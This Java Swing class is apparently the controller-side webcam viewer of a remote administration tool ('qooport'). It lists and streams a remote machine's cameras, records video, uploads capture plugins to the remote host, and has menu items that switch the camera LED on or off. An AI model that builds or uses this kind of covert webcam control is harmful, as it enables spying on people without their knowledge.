package qooport.modulos.camara;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Font;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.awt.event.KeyEvent;
import java.awt.event.WindowEvent;
import java.awt.event.WindowListener;
import java.awt.geom.GeneralPath;
import java.io.IOException;
import javax.swing.BorderFactory;
import javax.swing.JButton;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JComboBox;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JSlider;
import javax.swing.JTextField;
import javax.swing.JToolBar;
import javax.swing.JWindow;
import javax.swing.border.Border;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import network.Conexion;
import qooport.asociado.Asociado;
import qooport.gui.personalizado.BarraEstado;
import qooport.modulos.VentanaReproductor;
import static qooport.modulos.escritorioremoto.EscritorioRemoto.tipoLetra;
import qooport.modulos.reproductor.Contenedor;
import qooport.modulos.reproductor.Reproductor;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Util;
import qooport.utilidades.contador.ContadorBPS;

public class Camara extends VentanaReproductor implements WindowListener {

    private static int FORMATO = 4;
    static GraphicsDevice device = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
    private Reproductor reproductor;
    public boolean conetado;
    public BarraEstado barraInferior = new BarraEstado();
    public JMenuBar barra;
    private JPanel panelActivador;
    private JButton btnActivar;
    private JWindow frameControles;
    private JMenu menuAccion;
    private JMenu menuVer;
    private JMenu menuCalidad;
    private JMenu menuHerramientas;
    private JMenu menuCamaras;
    private JMenu menuResolucion;
    private JButton btnIniciarDetener;
    private JButton btnVerPantallaCompleta;
    private JCheckBoxMenuItem itmGrabar;
    private Asociado servidor;
    private JMenuItem lblCalidad;
    private JSlider jScalidad;
    private boolean pidiendo;
    private JMenuItem itmSubirPlugin;
    private JComboBox webcam;
    private JComboBox webcamSizes;
    private JMenuItem itmListarCamaras;
    private JMenuItem ListarResoluciones;
    private JMenuItem itmActivarLed;
    private JMenuItem itmDesactivarLed;
    private JCheckBoxMenuItem[] itmCamaras;
    private JCheckBoxMenuItem[] itmResoluciones;
    private ContadorBPS contadorFps;
    private ContadorBPS contadorBps;
    private ContadorBPS contadorTamanio;
    private RecibirCamara servicio;
    private Conexion conexion;
    private boolean pantallaCompleta = false;
    private boolean corriendoMostrar = false;
    private int tamanioBarra = 80;
    private Font fuenteMenus;
    private boolean noOculto;
    private String camaraNombre = "";
    private String strResolucion;
    private boolean corriendoOcultar = false;

    public Camara(Conexion conexion, Asociado servidor) {
        this.conexion = conexion;
        iniciarHilos();
        this.servidor = servidor;
        reproductor = new Reproductor();
        reproductor.setDirectorioEscritorio(getAgente().getdWebCam());
        initComponents();
        pidiendo = false;
//        yaLlego = true;
    }

    private void iniciarHilos() {
        servicio = new RecibirCamara(conexion, this);
        servicio.start();
        contadorFps = new ContadorBPS("Frames por segundo", "f", "ps", GuiUtil.crearJLabel("", "Frames por segundo", Util.cargarIcono16("/resources/ancho_banda.png")), ContadorBPS.FLOTANTE, false);
        contadorFps.start();
        contadorBps = new ContadorBPS("Ancho de banda", "", "/s", GuiUtil.crearJLabel("", "Ancho de banda", Util.cargarIcono16("/resources/ancho_banda.png")), ContadorBPS.BYTES, false);
        contadorBps.start();
        contadorTamanio = new ContadorBPS("Tamaño captura", "", "", GuiUtil.crearJLabel("", "Tamaño captura", Util.cargarIcono16("/resources/binary.png")), ContadorBPS.BYTES, true);
        contadorTamanio.start();
    }

    private void initComponents() {
        fuenteMenus = new Font(tipoLetra, 1, 11);
        barra = new JMenuBar();
        this.btnIniciarDetener = new JButton();
        this.itmGrabar = new JCheckBoxMenuItem();
        this.itmSubirPlugin = new JMenuItem();
        this.lblCalidad = new JMenuItem();
        this.webcam = new JComboBox();
        webcamSizes = new JComboBox();
        this.itmListarCamaras = new JMenuItem();
        ListarResoluciones = new JMenuItem();
        itmActivarLed = new JMenuItem();
        itmDesactivarLed = new JMenuItem();
        setResizable(true);
        setTitle("Cámara Remota ");
        try {
            setTitle("Cámara Remota [" + servidor.getInformacion() + "]");
        } catch (Exception e) {
        }

        menuAccion = new JMenu();
        this.menuAccion.setIcon(Util.cargarIcono20("/resources/rayo_azul.png"));
        this.menuAccion.setText("Acciones");
        menuAccion.setFont(fuenteMenus);
        itmListarCamaras.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        itmListarCamaras.setSelected(true);
        itmListarCamaras.setText("Listar cámaras");
        this.itmListarCamaras.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnListarAP(evt);
            }
        });

        this.menuAccion.add(this.itmListarCamaras);
        itmActivarLed.setIcon(Util.cargarIcono16("/resources/switch_on.png"));
        itmActivarLed.setSelected(true);
        itmActivarLed.setText("Activar Luz");
        itmActivarLed.setToolTipText("Activa el Led de la camara");
        itmActivarLed.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnActivarLedAP(evt);
            }
        });
        this.menuAccion.add(this.itmActivarLed);
        itmDesactivarLed.setIcon(Util.cargarIcono16("/resources/switch_off.png"));
        itmDesactivarLed.setSelected(true);
        itmDesactivarLed.setText("Desactivar Luz");
        itmDesactivarLed.setToolTipText("Desactiva el Led de la camara");
        this.itmDesactivarLed.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnDesactivaLedAP(evt);
            }
        });
        this.menuAccion.add(this.itmDesactivarLed);
        ListarResoluciones.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        ListarResoluciones.setSelected(true);
        ListarResoluciones.setText("Listar resoluciones");
        this.ListarResoluciones.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnListarSizesAP(evt);
            }
        });
        this.menuAccion.add(this.ListarResoluciones);
        itmSubirPlugin.setIcon(Util.cargarIcono16("/resources/plugin_add.png"));
        itmSubirPlugin.setVisible(true);
        itmSubirPlugin.setText("Subir plugins");
        itmSubirPlugin.setToolTipText("Subir plugins de captura");
        this.itmSubirPlugin.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnSubirPluginAP(evt);
            }
        });
        this.menuAccion.add(this.itmSubirPlugin);

        btnActivar = new JButton();
        btnActivar.setIcon(Util.cargarIcono("/resources/arrow_up_16.png", 8, 8));
        btnActivar.setSize(10, 10);
        btnActivar.setPreferredSize(new Dimension(10, 10));
        btnActivar.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                btnMostrarOcultarActionPerformed(evt);
            }
        });

        btnIniciarDetener.setIcon(Util.cargarIcono("/resources/start.png", 8, 8));
        btnIniciarDetener.setSelected(false);
        btnIniciarDetener.setSize(10, 10);
        btnIniciarDetener.setPreferredSize(new Dimension(10, 10));
        this.btnIniciarDetener.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnIniciarPararAP(evt);
            }
        });

        btnVerPantallaCompleta = new JButton();
        btnVerPantallaCompleta.setIcon(Util.cargarIcono("/resources/full_screen.png", 8, 8));
        btnVerPantallaCompleta.setSelected(false);
        btnVerPantallaCompleta.setToolTipText("Ver pantalla completa");
        btnVerPantallaCompleta.setSize(10, 10);
        btnVerPantallaCompleta.setPreferredSize(new Dimension(10, 10));
        this.btnVerPantallaCompleta.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent evt) {
                Camara.this.btnPantallaCompleta(evt);
            }
        });

        menuHerramientas = new JMenu();
        this.menuHerramientas.setIcon(Util.cargarIcono20("/resources/advancedsettings.png"));
        this.menuHerramientas.setText("Herramientas");
        menuHerramientas.setFont(fuenteMenus);
        itmGrabar.setIcon(Util.cargarIcono16("/resources/record_small.png"));
        itmGrabar.setSelected(false);
        itmGrabar.setText("Grabar");
        itmGrabar.setToolTipText("Grabar");
        menuHerramientas.add(itmGrabar);
        menuVer = new JMenu();
        menuVer.setFont(fuenteMenus);
        this.menuVer.setIcon(Util.cargarIcono20("/resources/eye_blue_32.png"));
        this.menuVer.setText("Ver");
        menuCamaras = new JMenu();
        this.menuCamaras.setIcon(Util.cargarIcono16("/resources/camera.png"));
        this.menuCamaras.setText("Cámara");
        menuCamaras.setFont(fuenteMenus);
        this.menuVer.add(this.menuCamaras);
        menuResolucion = new JMenu();
        this.menuResolucion.setIcon(Util.cargarIcono16("/resources/resize.png"));
        this.menuResolucion.setText("Resolución");
        menuResolucion.setFont(fuenteMenus);
        this.menuVer.add(this.menuResolucion);
        menuCalidad = new JMenu();
        this.menuCalidad.setIcon(Util.cargarIcono16("/resources/color_256.png"));
        this.menuCalidad.setText("Calidad");
        menuCalidad.setFont(fuenteMenus);
        this.lblCalidad.setIcon(Util.cargarIcono16("/resources/monitor.png"));
        this.lblCalidad.setText("75");
        jScalidad = new JSlider();
        jScalidad.setValue(75);
        jScalidad.setMaximum(100);
        jScalidad.setMinimum(1);
        jScalidad.addChangeListener(new ChangeListener() {
            @Override
            public void stateChanged(ChangeEvent evt) {
                Camara.this.caliStateChanged(evt);
            }
        });
        menuCalidad.add(lblCalidad);
        menuCalidad.add(jScalidad);
        menuVer.add(menuCalidad);

        reproductor.setContenedor(new Contenedor(this));
        barra.add(menuAccion);
        barra.add(menuVer);
        barra.add(menuHerramientas);
//        barra.add(menuConfig);
        barraInferior.agregarContador(contadorTamanio);
        barraInferior.agregarContador(contadorBps);
        barraInferior.agregarContador(contadorFps);
        panelActivador = new JPanel();
        panelActivador.setBackground(Color.BLACK);
        panelActivador.setSize(this.getWidth(), 10);
        panelActivador.setMinimumSize(new Dimension(50, 10));
        this.setLayout(new BorderLayout());
//        this.add(barra, BorderLayout.NORTH);
        this.add(panelActivador, BorderLayout.NORTH);
//        this.add(contenedorPrincipal, BorderLayout.CENTER);
        this.add(reproductor.getContenedor(), BorderLayout.CENTER);
        this.add(barraInferior, BorderLayout.SOUTH);
        actualizarFormaControles();
        this.setResizable(true);
        this.setVisible(true);
        this.setMinimumSize(new Dimension(300, 200));
        this.setIconImage(Util.cargarIcono16("/resources/camera.png").getImage());

        this.addComponentListener(new ComponentListener() {
            @Override
            public void componentResized(java.awt.event.ComponentEvent evt) {
//                Camara.this.pintar();
                actualizarFormaControles();
            }

            @Override
            public void componentMoved(java.awt.event.ComponentEvent evt) {
                actualizarFormaControles();
            }

            @Override
            public void componentShown(ComponentEvent e) {
                Camara.this.actualizarFormaControles();
            }

            @Override
            public void componentHidden(ComponentEvent e) {
                Camara.this.actualizarFormaControles();
            }
        });
        pack();
    }

    private void btnPantallaCompleta(ActionEvent evt) {
        if (!device.isFullScreenSupported()) {
            return;
        }
        pantallaCompleta = !pantallaCompleta;
        dispose();
        if (pantallaCompleta) {
            try {
                this.setUndecorated(true);
            } catch (Exception e) {
            }
            try {
                device.setFullScreenWindow(this);
            } catch (Exception e) {
            }
        } else {
            try {
                this.setUndecorated(false);
            } catch (Exception e) {
            }//
            try {
                device.setFullScreenWindow(null);
            } catch (Exception e) {
            }
        }
        setVisible(true);
        frameControles.setVisible(true);
        frameControles.pack();
        this.actualizarFormaControles();

    }

    private void caliStateChanged(ChangeEvent evt) {
        this.lblCalidad.setText(jScalidad.getValue() + "");
        servidor.pedirWebCam("jpg", FORMATO, this.jScalidad.getValue());
    }

    private void btnActivarLedAP(ActionEvent evt) {
        servidor.activarLed();
    }

    private void btnDesactivaLedAP(ActionEvent evt) {
        servidor.desactivarLed();
    }

    private void btnListarAP(ActionEvent evt) {
        servidor.listarWebCams();
    }

    private void btnListarSizesAP(ActionEvent evt) {
        servidor.listarWebCamsSizes();
    }

    private void btnIniciarPararAP(ActionEvent evt) {
        this.pidiendo = !this.pidiendo;
        if (this.pidiendo) {
            servicio = null;
            servicio = new RecibirCamara(conexion, this);
            servicio.start();
            servicio.setPidiendo(pidiendo);
            if (servidor.isAndroid()) {
//                this.servidor.abrirWebCam(this.webcam.getSelectedItem().toString());
                this.servidor.abrirWebCam(String.valueOf(camaraNombre));
            } else {
//                this.servidor.abrirWebCam(this.webcam.getSelectedItem().toString() + ":::" + this.webcamSizes.getSelectedItem().toString());
                this.servidor.abrirWebCam(String.valueOf(camaraNombre) + ":::" + strResolucion);
            }
            btnIniciarDetener.setIcon(Util.cargarIcono("/resources/stop_close.png", 8, 8));
            this.webcam.setEnabled(false);
            this.webcamSizes.setEnabled(false);
        } else {
            barraInferior.setEstado("Detenido");
            servicio.detener();
            this.webcam.setEnabled(true);
            this.webcamSizes.setEnabled(true);
            btnIniciarDetener.setIcon(Util.cargarIcono("/resources/start.png", 8, 8));
            this.servidor.cerrarWebCam();
            try {
                if (conexion != null) {
                    conexion.cerrar();
                }
            } catch (IOException ex) {
            }
            conexion = null;
        }

    }

    private void btnSubirPluginAP(ActionEvent evt) {
        servidor.enviarPluginsWebCam();
    }

    public Conexion getConexion() {
        return conexion;
    }

    public void setConexion(Conexion conexion) {
        servicio.setConexion(conexion);
        this.conexion = conexion;
    }

    public JComboBox getWebcam() {
        return webcam;
    }

    public void setWebcam(JComboBox webcam) {
        this.webcam = webcam;
    }

    public Asociado getAgente() {
        return servidor;
    }

    public void setServidor(Asociado servidor) {
        this.servidor = servidor;
    }

    public ContadorBPS getContadorFps() {
        return contadorFps;
    }

    public void setContadorFps(ContadorBPS contadorFps) {
        this.contadorFps = contadorFps;
    }

    public ContadorBPS getContadorBps() {
        return contadorBps;
    }

    public void setContadorBps(ContadorBPS contadorBps) {
        this.contadorBps = contadorBps;
    }

    public BarraEstado getBarraInferior() {
        return barraInferior;
    }

    public void setBarraInferior(BarraEstado barraInferior) {
        this.barraInferior = barraInferior;
    }

    public ContadorBPS getContadorTamanio() {
        return contadorTamanio;
    }

    public void setContadorTamanio(ContadorBPS contadorTamanio) {
        this.contadorTamanio = contadorTamanio;
    }

    public JComboBox getWebcamSizes() {
        return webcamSizes;
    }

    public void setWebcamSizes(JComboBox webcamSizes) {
        this.webcamSizes = webcamSizes;
    }

    @Override
    public void windowOpened(WindowEvent e) {
        actualizarFormaControles();
    }

    @Override
    public void windowClosing(WindowEvent e) {
        if (pidiendo) {
            this.btnIniciarPararAP(null);
            this.btnIniciarDetener.setSelected(pidiendo);
        }
        servicio = null;
        servidor.cerrarCamara();
    }

    @Override
    public void windowClosed(WindowEvent e) {
    }

    @Override
    public void windowIconified(WindowEvent e) {
    }

    @Override
    public void windowDeiconified(WindowEvent e) {
    }

    @Override
    public void windowActivated(WindowEvent e) {
        actualizarFormaControles();
    }

    @Override
    public void windowDeactivated(WindowEvent e) {
        actualizarFormaControles();
    }

    public void ponerTextoMenus() {
        menuAccion.setText("Acciones");
        menuVer.setText("Ver");
        menuHerramientas.setText("Herramientas");
//        menuConfig.setText("Configuración");
    }

    public void quitarTextoMenus() {
        menuAccion.setText("");
        menuVer.setText("");
        menuHerramientas.setText("");
//        menuConfig.setText("");
    }

    private void actualizarFormaControles() {
        try {
            if (frameControles == null) {
                frameControles = new JWindow(this);
                frameControles.setLayout(new BorderLayout());
                frameControles.setType(Type.UTILITY);
                frameControles.setVisible(true);
                btnActivar.setBorderPainted(false);
                btnVerPantallaCompleta.setBorderPainted(false);
                btnIniciarDetener.setBorderPainted(false);
                
                JToolBar panelSur = new JToolBar();
                panelSur.setBackground(barra.getBackground());
                panelSur.setOpaque(true);
                panelSur.setFloatable(false);
                panelSur.setBorder(BorderFactory.createEmptyBorder(0, 0, 0, 0));
                panelSur.setMargin(new Insets(0, 0, 0, 0));
                panelSur.setLayout(new FlowLayout(FlowLayout.CENTER));
                panelSur.add(btnActivar);
                panelSur.add(btnVerPantallaCompleta);
                panelSur.add(btnIniciarDetener);
                frameControles.add(panelSur, BorderLayout.SOUTH);
                frameControles.add(barra, BorderLayout.NORTH);
                frameControles.pack();
                tamanioBarra = frameControles.getHeight();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            int ancho = 300;
            GeneralPath path = new GeneralPath(GeneralPath.WIND_NON_ZERO);
            int ajuste = 9;
            int anchoPestania = 60;
            int altoControles = frameControles.getHeight();
            if (altoControles < 0) {
                altoControles = 0;
            }
            int altoPestania = btnActivar.getHeight();
            ancho = this.getWidth() * 80 / 100;
            if (ancho > 290) {
                ancho = 290;
            }
            if (ancho > 280) {
                ponerTextoMenus();
            } else {
                ancho = 150;
                quitarTextoMenus();
            }
//            path.moveTo(0, 0);
////            path.lineTo(10, altoControles - altoPestania - ajuste);
//            path.lineTo(0, altoControles - altoPestania - ajuste);
//            path.lineTo(ancho / 2 - 30, altoControles - altoPestania - ajuste);
//            path.lineTo(ancho / 2 - 30, altoControles - ajuste + 5);
////            path.lineTo(ancho / 2 - 27, altoControles - ajuste + 5);
////            path.lineTo(ancho / 2 + 27, altoControles - ajuste + 5);
//            path.lineTo(ancho / 2 + 30, altoControles - ajuste + 5);
//            path.lineTo(ancho / 2 + 30, altoControles - altoPestania - ajuste);
////            path.lineTo(ancho - 10, altoControles - altoPestania - ajuste);
//            path.lineTo(ancho, altoControles - altoPestania - ajuste);
//            path.lineTo(ancho, 0);
//            path.lineTo(0, 0);

            int curva = 3;

            /*

              P0 ______________________________P7
                |                              |
              P1|____________P2   P5___________| P6
                            |______|
                           P3     P4

             */
            path.moveTo(0, 0); //P0
            path.lineTo(0, altoControles - altoPestania - ajuste - curva); // P1 -1
            path.lineTo(curva, altoControles - altoPestania - ajuste); // P1 -2

            path.lineTo(ancho / 2 - anchoPestania / 2, altoControles - altoPestania - ajuste); // P2

            path.lineTo(ancho / 2 - anchoPestania / 2, altoControles - ajuste + 5 - curva); // P3 -1
            path.lineTo(ancho / 2 - anchoPestania / 2 + curva, altoControles - ajuste + 5); // P3 -2

            path.lineTo(ancho / 2 + anchoPestania / 2 - curva, altoControles - ajuste + 5); // P4 -1
            path.lineTo(ancho / 2 + anchoPestania / 2, altoControles - ajuste + 5 - curva); // P4 -2

            path.lineTo(ancho / 2 + anchoPestania / 2, altoControles - altoPestania - ajuste); // P5

            path.lineTo(ancho - curva, altoControles - altoPestania - ajuste); // P6 -1
            path.lineTo(ancho, altoControles - altoPestania - ajuste - curva); // P6 -2
            path.lineTo(ancho, 0); // P7
            path.lineTo(0, 0); //P0
            frameControles.setShape(path);
            frameControles.setSize(ancho, altoControles);

            int y = 0;
            try {
//                y = (int) panelActivador.getLocationOnScreen().getY();
                y = (int) reproductor.getContenedor().getLocationOnScreen().getY();
            } catch (Exception e) {
                y = (int) this.getBounds().getY() + 35;
            }

            frameControles.setLocation((int) this.getBounds().getX() + (int) this.getWidth() / 2 - frameControles.getWidth() / 2, y);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void ocultarControles() {
        if (corriendoOcultar) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                corriendoOcultar = true;
                for (int i = frameControles.getHeight(); i > btnActivar.getHeight() + 9; i -= 10) {
                    frameControles.setSize(frameControles.getWidth(), i);
                    actualizarFormaControles();
                    try {
                        Thread.sleep(50);
                    } catch (InterruptedException ex) {
                    }
                }
                frameControles.setSize(frameControles.getWidth(), btnActivar.getHeight() + 9);
                corriendoOcultar = false;
                actualizarFormaControles();
            }
        }
        ).start();
    }

    private void mostrarControles() {
        if (corriendoMostrar) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                corriendoMostrar = true;
                for (int i = btnActivar.getHeight(); i < tamanioBarra; i += 10) {
                    frameControles.setSize(frameControles.getWidth(), i);
                    actualizarFormaControles();
                    try {
                        Thread.sleep(50);
                    } catch (InterruptedException ex) {
                    }
                }
                corriendoMostrar = false;
                actualizarFormaControles();
            }
        }
        ).start();
    }

    private void btnMostrarOcultarActionPerformed(ActionEvent evt) {
        this.noOculto = !this.noOculto;
        if (!this.noOculto) {
            mostrarControles();
            btnActivar.setIcon(Util.cargarIcono("/resources/arrow_up_16.png", 8, 8));
        } else {
            ocultarControles();
            btnActivar.setIcon(Util.cargarIcono("/resources/arrow_down_16.png", 8, 8));
        }
    }

    public JCheckBoxMenuItem getItmGrabar() {
        return itmGrabar;
    }

    public void setItmGrabar(JCheckBoxMenuItem itmGrabar) {
        this.itmGrabar = itmGrabar;
    }

    public JMenuItem getItmSubirPlugin() {
        return itmSubirPlugin;
    }

    public void setItmSubirPlugin(JMenuItem itmSubirPlugin) {
        this.itmSubirPlugin = itmSubirPlugin;
    }

    public void seleccionarMonitor(int indice) {
        try {
            for (int i = 0; i < webcam.getItemCount(); i++) {
                itmCamaras[i].setSelected(false);
            }
            Camara.this.camaraNombre = (String) webcam.getItemAt(indice);
            itmCamaras[indice].setSelected(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void seleccionarResolucion(int indice) {
        try {
            for (int i = 0; i < webcamSizes.getItemCount(); i++) {
                itmResoluciones[i].setSelected(false);
            }
            Camara.this.strResolucion = itmResoluciones[indice].getText();
            itmResoluciones[indice].setSelected(true);
        } catch (Exception e) {
        }
    }

    public void actualizarMenuCamaras() {
        try {
            menuCamaras.removeAll();
            Camara.this.camaraNombre = (String) webcam.getItemAt(0);
//        menuMonitor.add(btnListarMonitores);
            itmCamaras = new JCheckBoxMenuItem[webcam.getItemCount()];
            for (int i = 0; i < webcam.getItemCount(); i++) {
                final String item = (String) webcam.getItemAt(i);
                final int indice = i;
                itmCamaras[i] = new JCheckBoxMenuItem();
                itmCamaras[i].setIcon(Util.cargarIcono16("/resources/camera.png"));
                itmCamaras[i].setText(item);
                itmCamaras[i].setFont(fuenteMenus);
                itmCamaras[i].addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent evt) {
                        try {
                            Camara.this.seleccionarMonitor(indice);
                        } catch (Exception e) {
                            Camara.this.camaraNombre = (String) webcam.getItemAt(0);
                        }
                    }
                });
                menuCamaras.add(itmCamaras[i]);
            }
            itmCamaras[0].setSelected(true);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void actualizarMenuResolucion() {
        try {
            menuResolucion.removeAll();
            strResolucion = (String) webcamSizes.getItemAt(0);
            itmResoluciones = new JCheckBoxMenuItem[webcamSizes.getItemCount()];
            for (int i = 0; i < webcamSizes.getItemCount(); i++) {
                final String item = (String) webcamSizes.getItemAt(i);
                final int indice = i;
                itmResoluciones[i] = new JCheckBoxMenuItem();
                itmResoluciones[i].setText(item);
                itmResoluciones[i].setFont(fuenteMenus);
                itmResoluciones[i].addActionListener(new ActionListener() {
                    @Override
                    public void actionPerformed(ActionEvent evt) {
                        try {
                            Camara.this.seleccionarResolucion(indice);
                        } catch (Exception e) {
                            Camara.this.strResolucion = (String) webcamSizes.getItemAt(0);
                            Camara.this.seleccionarResolucion(0);
                        }
                    }
                });
                menuResolucion.add(itmResoluciones[i]);
            }
            itmResoluciones[0].setSelected(true);
        } catch (Exception e) {

        }
    }

    public Reproductor getReproductor() {
        return reproductor;
    }

    public void setReproductor(Reproductor reproductor) {
        this.reproductor = reproductor;
    }

    //-------------------------------
    @Override
    public void mouseMove(float f, float f1, int i, int i1) {

    }

    @Override
    public void mouseDragged(float px, float py, int boton, int pantallaID) {

    }

    @Override
    public void mousePresionado(float f, float f1, int i, int i1) {

    }

    @Override
    public void mouseLiberado(float f, float f1, int i, int i1) {

    }

    @Override
    public void mouseRueda(float f, float f1, int i, int i1, int i2) {

    }

    @Override
    public void keyTyped(KeyEvent ke) {

    }

    @Override
    public void keyPressed(KeyEvent ke) {

    }

    @Override
    public void keyReleased(KeyEvent ke) {

    }

    public int getESCALA() {
        return VentanaReproductor.ESCALA_PERFECTO;
    }

    public JComboBox getCmbMonitor() {
        return null;
    }

    public JTextField getTxtColumnas() {
        return null;
    }

    @Override
    public Boolean isEscalarRemoto() {
        return false;
    }

    @Override
    public Boolean isAjustarVentana() {
        return false;
    }

    @Override
    public Boolean isEscalarSuave() {
        return true;
    }

}
